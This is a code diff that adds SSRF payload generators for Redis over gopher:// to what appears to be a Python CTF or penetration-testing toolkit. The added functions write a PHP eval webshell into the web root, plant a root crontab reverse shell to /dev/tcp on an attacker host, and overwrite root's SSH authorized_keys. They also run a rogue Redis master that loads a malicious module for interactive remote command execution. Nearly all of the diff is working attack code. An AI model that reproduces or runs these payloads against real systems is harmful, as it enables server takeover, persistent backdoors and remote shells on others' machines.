@@ -15,6 +15,7 @@ from threading import Thread, Lock
 from time import time
 from typing import Dict, List, Tuple, Union
 from urllib.parse import quote, quote_plus, urljoin
+from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
 
 import requests
 import socketio
@@ -30,6 +31,9 @@ class HashType(Enum):
     SHA1 = 1
     SHA256 = 2
     SHA512 = 3
+
+
+CRLF = "\r\n"
 
 
 filepath = str
@@ -997,3 +1001,219 @@ Custom payload:
         except KeyboardInterrupt:
             print('[#] KeyboardInterrupt')
             server.shutdown()
+
+
+def _redis_format(*redis_cmd):
+    if len(redis_cmd) == 0:
+        return ""
+
+    cmd = f"*{len(redis_cmd)}"
+    for line in redis_cmd:
+        cmd += f"{CRLF}${len(line)}{CRLF}{line}"
+    cmd += CRLF
+    return cmd
+
+
+def gopherredis_webshell(host: str, authPass: str = "", webFile: str = "/var/www/html/syc.php", content: str = "<?php eval($_REQUEST['syc']); ?>", urlEncoding: bool = False) -> str:
+    """generate gopher payload for attack redis to write webshell.
+
+    Args:
+        host (str): target redis host.
+        authPass (str, optional): redis auth pass. Defaults to "".
+        webFile (str, optional): file path you want to write. Defaults to "/var/www/html/syc.php".
+        content (str, optional): file content you want to write. Defaults to "<?php eval(['syc']); ?>".
+        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
+
+    Returns:
+        str: generated payload
+    """
+    start = f"gopher://{host}/_"
+    origin = ""
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["flushall"],
+        ["set", "1", f'{content}'],
+        ["config", "set", "dir", f'{path.dirname(webFile)}'],
+        ["config", "set", "dbfilename", f'{path.basename(webFile)}'],
+        ["save"]
+    ]
+    for line in payload:
+        origin += quote(_redis_format(*line))
+
+    if urlEncoding:
+        return quote(start + origin)
+
+    return start + origin
+
+
+def gopherredis_crontab(host: str, authPass: str = "", crontabFile: str = "/var/spool/cron/crontabs/root", reHost: str = "127.0.0.1:2020", urlEncoding: bool = False) -> str:
+    """generate gopher payload for attack redis to write crontab.
+
+    Args:
+        host (str): target redis host.
+        authPass (str, optional): redis auth pass. Defaults to "".
+        crontabFile (str, optional): file path you want to write. Defaults to "/var/spool/cron/crontabs/root".
+        reHost (str, optional): reverse shell host. Defaults to "127.0.0.1:2020".
+        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
+
+    Returns:
+        str: generated payload
+    """
+    start = f"gopher://{host}/_"
+    origin = ""
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["flushall"],
+        ["set", "1",
+            f'\n\n*/1 * * * * bash -i >& /dev/tcp/{reHost.replace(":", "/")} 0>&1\n\n'],
+        ["config", "set", "dir", f'{path.dirname(crontabFile)}'],
+        ["config", "set", "dbfilename", f'{path.basename(crontabFile)}'],
+        ["save"]
+    ]
+    for line in payload:
+        origin += quote(_redis_format(*line))
+
+    if urlEncoding:
+        return quote(start + origin)
+
+    return start + origin
+
+
+def gopherredis_ssh(host: str, authPass: str = "", sshFile: str = "/root/.ssh/authorized_keys", content: str = "", urlEncoding: bool = False) -> str:
+    """generate gopher payload for attack redis to write ssh authorized keys.
+
+    Args:
+        host (str): target redis host.
+        authPass (str, optional): redis auth pass. Defaults to "".
+        sshFile (str, optional): file path you want to write. Defaults to "/root/.ssh/authorized_keys".
+        content (str, optional): file content you want to write. Defaults to "127.0.0.1:2020".
+        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
+
+    Returns:
+        str: generated payload
+    """
+    start = f"gopher://{host}/_"
+    origin = ""
+
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["flushall"],
+        ["set", "1", f'\n\n{content}\n\n'],
+        ["config", "set", "dir", f'{path.dirname(sshFile)}'],
+        ["config", "set", "dbfilename", f'{path.basename(sshFile)}'],
+        ["save"]
+    ]
+
+    for line in payload:
+        origin += quote(_redis_format(*line))
+
+    if urlEncoding:
+        return quote(start + origin)
+
+    return start + origin
+
+
+def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str = "",
+                    expFileName: str = "syc.so", command="id",  interactive: bool = False, urlEncoding: bool = False):
+    """generate gopher payload for attack redis by master-slave replication.This will be a series of processes, including output payload, listen server, etc.
+
+    Args:
+        host (str): target redis host.
+        masterHost (str, optional): listen host. Defaults to "127.0.0.1:2020".
+        authPass (str, optional): redis auth pass. Defaults to "".
+        expFileName (str, optional): exploit file name, you can custom it like *.so. Defaults to "syc.so".
+        command (str, optional): command you want to run. Defaults to "id".
+        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
+    """
+
+    def formatOutput(content: str, urlEncoding: bool = False):
+        if urlEncoding:
+            return quote(content)
+        return content
+
+    def RogueServer(ip, port):
+        with open(path.join(path.split(path.realpath(__file__))[0], "../", "thirdparty", "redis", "exp.so"), "rb") as f:
+            exp = f.read()
+
+        flag = True
+
+        s = socket(AF_INET, SOCK_STREAM)
+        s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        s.bind((ip, port))
+        s.listen(10)
+        client, _ = s.accept()
+        while flag:
+            getData = client.recv(1024)
+            if b"PING" in getData:
+                client.send(b"+PING\r\n")
+                flag = True
+            elif b"REPLCONF" in getData:
+                client.send(b"+OK\r\n")
+                flag = True
+            elif b"PSYNC" in getData or b"SYNC" in getData:
+                client.send(b"+FULLRESYNC " + b"sycv5" * 8 + b" 1\r\n" + b"$" + str(
+                    len(exp)).encode() + b"\r\n" + exp + b"\r\n")
+                flag = False
+
+    start = f"gopher://{host}/_"
+    origin = ""
+
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["flushall"],
+        ["slaveof", "no", "one"],
+        ["slaveof", masterHost.split(":")[0], masterHost.split(":")[-1]],
+        ["config", "set", "dbfilename", f'{path.basename(expFileName)}'],
+    ]
+
+    for line in payload:
+        origin += quote(_redis_format(*line))
+    print("--- Ready slave ---")
+    print(formatOutput(start + origin, urlEncoding))
+
+    print("--- Build server ---")
+    RogueServer(ip=masterHost.split(
+        ":")[0], port=int(masterHost.split(":")[-1]))
+
+    print("--- Load module ---")
+    origin = ""
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["module", "load", f"./{expFileName}"]
+    ]
+    for line in payload:
+        origin += quote(_redis_format(*line))
+    print(formatOutput(start + origin, urlEncoding))
+
+    if not interactive:
+        origin = ""
+        payload = [
+            ["auth", f'{authPass}'] if authPass else [],
+            ["system.exec", f'{command}']
+        ]
+        for line in payload:
+            origin += quote(_redis_format(*line))
+
+        print(f"--- Command {command} ---")
+        print(formatOutput(start + origin, urlEncoding))
+    else:
+        try:
+            while interactive:
+                command = input("command>: ")
+                if command == "exit" or command == "quit":
+                    break
+                origin = ""
+                payload = [
+                    ["auth", f'{authPass}'] if authPass else [],
+                    ["system.exec", f'{command}']
+                ]
+                for line in payload:
+                    origin += quote(_redis_format(*line))
+
+                print(f"--- Command {command} ---")
+                print(formatOutput(start + origin, urlEncoding))
+        except KeyboardInterrupt:
+            print()
+            print("--- exit ---")
+        except Exception as e:
+            print(f"--- Error: {e} ---")
